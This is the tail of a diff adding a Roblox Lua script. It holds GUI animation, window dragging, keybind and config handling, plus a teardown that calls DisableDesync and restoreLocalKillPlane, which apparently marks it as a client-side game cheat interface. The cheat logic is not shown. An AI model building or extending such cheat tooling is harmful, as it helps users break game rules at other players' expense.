+end)
+
+RunService.RenderStepped:Connect(function(dt)
+    outlineGradient.Rotation = (outlineGradient.Rotation + dt * 140) % 360
+    themeOutlineGradient.Rotation = outlineGradient.Rotation
+end)
+
+RunService.Heartbeat:Connect(function(dt)
+    for _, p in ipairs(rainParticles) do
+        local f = p.frame
+        if f and f.Parent then
+            local newY = f.Position.Y.Scale + p.speed * dt * 1.1
+            local newX = f.Position.X.Scale + p.drift * dt * 1.4
+            if newY > 1.05 or newX > 1.05 or newX < -0.05 then
+                f.Position = UDim2.new(math.random(), 0, -0.05, 0)
+                f.Size = UDim2.new(0, 1 + math.random() * 1.6, 0, 6 + math.random() * 9)
+                f.BackgroundTransparency = 0.05 + math.random() * 0.35
+            else
+                f.Position = UDim2.new(newX, 0, newY, 0)
+            end
+        end
+    end
+end)
+
+local dragging, dragInput, dragStart, startPos = false, nil, nil, nil
+
+main.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = true
+        dragInput = input
+        dragStart = input.Position
+        startPos = main.Position
+        local c
+        c = input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                dragging = false
+                dragInput = nil
+                local pos = main.Position
+                config.pos = {pos.X.Scale, pos.X.Offset, pos.Y.Scale, pos.Y.Offset}
+                SaveConfig()
+                c:Disconnect()
+            end
+        end)
+    end
+end)
+
+main.InputChanged:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+        dragInput = input
+    end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+    if not dragging or input ~= dragInput or not dragStart or not startPos then return end
+    local delta = input.Position - dragStart
+    local nx = startPos.X.Offset + delta.X
+    local ny = startPos.Y.Offset + delta.Y
+    main.Position = UDim2.new(startPos.X.Scale, nx, startPos.Y.Scale, ny)
+    themePanel.Position = UDim2.new(startPos.X.Scale, nx + 140, startPos.Y.Scale, ny + THEME_PANEL_DROP)
+end)
+
+if config.bind and config.bind ~= "NONE" then
+    local success, key = pcall(function()
+        return Enum.KeyCode[config.bind]
+    end)
+    if success and key then
+        boundKey = key
+        if not config.bindType or config.bindType == "Keyboard" then
+            config.bindType = "Keyboard"
+        end
+        keybindButton.Text = key.Name
+    end
+end
+
+applyToggleVisual(false, true)
+applyTheme(COLORS.accent)
+
+if config.enabled then
+    task.defer(function()
+        setEnabled(true)
+    end)
+end
+
+runtime.destroy = function()
+    runtime.alive = false
+    DisableDesync()
+    restoreLocalKillPlane()
+    for _, conn in ipairs(runtime.connections) do
+        disconnect(conn)
+    end
+    runtime.connections = {}
+    if screenGui then pcall(function() screenGui:Destroy() end) end
+    if environment[RUNTIME_KEY] == runtime then
+        environment[RUNTIME_KEY] = nil
+    end
+end
+
+game:BindToClose(function()
+    SaveConfig()
+end)
